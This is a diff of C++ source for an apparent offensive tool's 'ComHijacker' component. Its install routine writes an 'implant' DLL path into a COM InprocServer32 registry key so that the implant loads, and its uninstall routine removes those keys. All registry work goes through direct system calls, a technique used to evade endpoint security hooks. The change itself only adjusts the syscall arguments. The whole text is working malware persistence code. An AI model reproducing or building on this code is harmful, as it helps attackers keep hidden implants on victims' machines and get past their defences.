@@ -46,9 +46,9 @@ namespace {
 
             HANDLE hKey = NULL;
             ULONG disp = 0;
-            status = InternalDoSyscall(ntCreateKeySsn, &hKey, DesiredAccess, &objAttr, 0, NULL, 0, &disp);
+            status = InternalDoSyscall(ntCreateKeySsn, &hKey, (PVOID)DesiredAccess, &objAttr, 0, NULL, 0, &disp, NULL, NULL, NULL);
 
-            if (hParent) InternalDoSyscall(ntCloseSsn, hParent);
+            if (hParent) InternalDoSyscall(ntCloseSsn, hParent, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
 
             if (!NT_SUCCESS(status)) return status;
             hParent = hKey;
@@ -86,7 +86,7 @@ bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& c
 
         // Set default value (implant path)
         UNICODE_STRING uEmpty = {0, 0, NULL};
-        InternalDoSyscall(ntSetValueKeySsn, hKey, &uEmpty, 0, REG_SZ, (PVOID)implantPath.c_str(), (ULONG)((implantPath.length() + 1) * sizeof(wchar_t)));
+        InternalDoSyscall(ntSetValueKeySsn, hKey, &uEmpty, 0, (PVOID)REG_SZ, (PVOID)implantPath.c_str(), (PVOID)(ULONG)((implantPath.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL);
 
         // Set ThreadingModel
         std::wstring tm = L"ThreadingModel";
@@ -96,9 +96,9 @@ bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& c
         uTm.MaximumLength = uTm.Length + sizeof(wchar_t);
 
         std::wstring tmVal = L"Both";
-        InternalDoSyscall(ntSetValueKeySsn, hKey, &uTm, 0, REG_SZ, (PVOID)tmVal.c_str(), (ULONG)((tmVal.length() + 1) * sizeof(wchar_t)));
+        InternalDoSyscall(ntSetValueKeySsn, hKey, &uTm, 0, (PVOID)REG_SZ, (PVOID)tmVal.c_str(), (PVOID)(ULONG)((tmVal.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL);
 
-        InternalDoSyscall(ntCloseSsn, hKey);
+        InternalDoSyscall(ntCloseSsn, hKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
         LOG_INFO("COM registration keys set via direct syscalls.");
         return true;
     } else {
@@ -130,7 +130,7 @@ bool ComHijacker::Uninstall(const std::wstring& clsid) {
     InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
     HANDLE hKey = NULL;
-    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hKey, KEY_ALL_ACCESS, &objAttr);
+    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hKey, (PVOID)KEY_ALL_ACCESS, &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
     if (NT_SUCCESS(status)) {
         // We should delete InprocServer32 first
         std::wstring subPath = fullPath + L"\\InprocServer32";
@@ -143,13 +143,13 @@ bool ComHijacker::Uninstall(const std::wstring& clsid) {
         InitializeObjectAttributes(&subAttr, &uSubPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
         HANDLE hSubKey = NULL;
-        if (NT_SUCCESS(InternalDoSyscall(ntOpenKeySsn, &hSubKey, KEY_ALL_ACCESS, &subAttr))) {
-            InternalDoSyscall(ntDeleteKeySsn, hSubKey);
-            InternalDoSyscall(ntCloseSsn, hSubKey);
+        if (NT_SUCCESS(InternalDoSyscall(ntOpenKeySsn, &hSubKey, (PVOID)KEY_ALL_ACCESS, &subAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL))) {
+            InternalDoSyscall(ntDeleteKeySsn, hSubKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+            InternalDoSyscall(ntCloseSsn, hSubKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
         }
 
-        status = InternalDoSyscall(ntDeleteKeySsn, hKey);
-        InternalDoSyscall(ntCloseSsn, hKey);
+        status = InternalDoSyscall(ntDeleteKeySsn, hKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+        InternalDoSyscall(ntCloseSsn, hKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
     }
 
     return NT_SUCCESS(status);
